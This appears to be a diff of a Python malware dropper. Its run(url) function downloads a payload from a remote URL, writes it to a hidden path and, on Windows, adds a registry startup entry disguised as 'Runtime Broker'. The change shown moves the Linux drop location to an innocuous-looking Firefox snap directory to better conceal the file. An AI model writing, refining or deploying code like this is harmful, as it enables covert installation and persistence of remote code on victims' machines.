@@ -104,7 +104,7 @@ def run(url):
         add_registry_startup(file_path, "Runtime Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/run/udev/tags/systemd/system"
+        file_path = "/home/snap/firefox/common/firefox_stuff"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}win")
             with open(file_path, 'wb') as file:
